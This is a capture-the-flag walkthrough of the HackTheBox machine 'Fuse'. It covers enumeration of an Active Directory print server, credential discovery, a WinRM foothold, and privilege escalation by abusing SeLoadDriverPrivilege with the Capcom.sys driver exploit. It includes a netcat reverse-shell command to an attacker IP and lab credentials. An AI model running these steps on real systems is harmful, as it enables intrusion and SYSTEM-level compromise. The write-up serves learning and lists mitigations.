# Fuse

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- Print logs

- Domain Users and Printers

__Exploitation__

- Weak password policy

__Priv Esc__

- GPO/SeLoadDriverPrivilege abuse

***

This is my guide to the HackTheBox Windows machine _Fuse_.

## User Flag

First, let's scan _Fuse_ with `nmap`.

- __sC__: Enable common scripts

- __sV__: version and service on the port

- __O__: remote OS detection using fingerprinting

```
# Nmap 7.80 scan initiated Thu Jul  9 17:07:24 2020 as: nmap -O -sC -sV -oA scan193 10.10.10.193
Nmap scan report for 10.10.10.193
Host is up (0.085s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-07-09 22:25:10Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/9%Time=5F07952F%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h37m33s, deviation: 4h02m32s, median: 17m31s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2020-07-09T15:27:38-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-07-09T22:27:34
|_  start_date: 2020-07-09T04:32:43

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul  9 17:12:42 2020 -- 1 IP address (1 host up) scanned in 318.15 seconds
```

Once that scan finishes, let's start a full scan in the background and start enumerating the various ports that are open. This box looks like a domain controller based on open ports. Additionally, port 80 indicates that it is also serving a webpage of some sort.

```
$ sudo nmap -sC -sV -O -p- -oA full180 10.10.10.193
[...]
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
[...]
```

Our full port scan returns, revealing port 5985 is open, which typically serves `WinRM 2.0 (Microsoft Windows Remote Management)`, allowing for authenticated remote connections. If we find some credentials, we can try them here.

Okay, let's try to navigate to the webpage first and see what we can enumerate. When we use the IP address in our browser, it attempts to resolve it to `http://fuse.fabricorp.local/`. Let's go ahead and add that to our `/etc/hosts` file. Once that's done, let's reattempt.

![](images/papercut.png)

Looks like this webpage hosts a print management service. It's pretty barebones, but logs are present and they reveal some interesting information.

![](images/print-logs.png)

![](images/print-logs-2.png)

The logs specifically contain the domain usernames that have used the printer. Let's make note of the users we find and save them for later.

```
bnielson
pmerton
tlavel
sthompson
bhult
```

Further enumeration reveals little, but one thing stands out within the logs from 30 May. User `sthompson` printed a word document named `Fabricorp01.docx`. Interestingly enough, this looks like a passsword. Let's create another file for potential passwords.

Now, we have a very short list of potential credentials, so we can start enumerating the services that require authentication. Since this is a domain network, we can first check SMB and see if we can access any network shares.

```
$ smbclient -L 10.10.10.193 -U bnielson%Fabricorp01
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
$ smbclient -L 10.10.10.193 -U tlavel%Fabricorp01
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
$ smbclient -L 10.10.10.193 -U bhult%Fabricorp01
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
```

Using any of the usernames, we receive an error indicating that the password has expired and must be changed. Let's arbitrarily select a username to use and reset it to something we can remember with the `smbpasswd` tool.

```
$ smbpasswd -r 10.10.10.193 -U bnielson
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user bnielson
```

After we reset it, we have a short window to test various services before it reverts and requires a reset again. After painstakingly poking around, we discover that we can enumerate RPC with `rpcclient` using the password we've set.

```
$ rpcclient -U "bnielson" 10.10.10.193
Enter WORKGROUP\bnielson's password:
rpcclient $>
```

Awesome! Let's enumerate the domain users and see what we can find.

```
> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x641]
user:[tlavel] rid:[0x642]
user:[pmerton] rid:[0x643]
user:[svc-scan] rid:[0x645]
user:[bhult] rid:[0x1bbd]
user:[dandrews] rid:[0x1bbe]
user:[mberbatov] rid:[0x1db1]
user:[astein] rid:[0x1db2]
user:[dmuir] rid:[0x1db3]
```

We'll also recall that this scenario is based around a print service, so we can safely assume the domain has printers. Let's enumerate them.

```
> enumprinters
	flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]
```

Right in the description is a password! And we've also discovered the username on the domain for the print service: `svc-print`. Let's see if this password is current and attempt remote access using `evil-winrm`, a Windows Remote Management tool for pentesting.

```
$ evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'
```

We've successfully gained a foothold, let's grab the first flag.

![](images/user-flag.png)

## Root Flag

Alright, let's try to escalate our privileges. Before diving into more intrusive enumeration methods, we'll run the `whoami` command to see if we have any special access or privileges that we can abuse.

```
> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ==============================================
fabricorp\svc-print S-1-5-21-2633719317-1471316042-3957863514-1104


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
FABRICORP\IT_Accounts                      Group            S-1-5-21-2633719317-1471316042-3957863514-1604 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We have a lot of interesting privileges as the `svc-print` user but one stands out:

```
SeLoadDriverPrivilege         Load and unload device drivers Enabled
```

[This article](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/) from Tarlogic explains how this privilege can be abused to elevate to Administrator. Essentially, since we can load drivers as this user, we can utilize a custom, malicious toolset to load the `capcom.sys` driver. Once it's loaded, we can run another program to gain a reverse SYSTEM shell.

Okay, first things first, we'll grab the two tools from GitHub that we will need to compile ourselves mentioned in the Tarlogic article. The first one will compile into an executable called `LOADDRIVER.exe`. This program should suffice as is. We'll use Visual Studios 2019 to edit and compile our projects.

![](images/loaddriver.PNG)

Once that's compiled, we'll move to the executable `ExploitCapcom.exe`. We'll need to make a change to the `LaunchShell()` function to run our desired command in a privileged context. We'll create a simple batch file (`C:\temp\nc.exe 10.10.14.251 4444 -e cmd.exe`) that will run a `netcat` command to open a reverse shell. We'll add the command to execute the batch file at line 292. Once that's done we'll compile it.

![](images/exploitcapcom.PNG)

Okay, we've got our files. Let's upload them to a `temp` directory on the victim machine with `evil-winrm`. We'll have to upload a `netcat` executable as well so that our batch file works.

![](images/file-uploads.png)

On our Kali box, we'll start a `netcat` listener in preparation to capture a callback.

```
nc -lvnp 4444
```

Now, let's start performing the exploit. We'll run the `LOADDRIVER.exe` to prepare the driver.

```
> .\LOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
NTSTATUS: 00000000, WinError: 0
```

And then we'll run the `ExploitCapcom` executable.

```
> .\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 0000023E932F0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```

Back on our Kali machine, we receive a reverse shell. Success! Let's grab the root flag.

![](images/root-flag.png)

***

### Mitigation

- Documents shouldn't be named after a domain password. Especially if this password is currently being used, albeit expired.

- Audit the domain and its exposed information often. An active password in the description of an account is bad practice and is pretty readily exposed with a couple steps. This needs to be considered even more when that account has privileges that can be abused to achieve privilege escalation.

### Final Thoughts

Unique box, the path to SYSTEM was very print-centric and I learned a lot about configuration and usage of print services within a domain. I didn't enjoy finding the password as a filename, as that took entirely too long and was easy to miss. Overall, though, I learned a few neat tricks that feel realistic enough to save for later. Additionally, I took some time to look through the exploit source code, since it's so readily available, and learned some interesting things about how this service abuse works, I'd recommend doing the same.
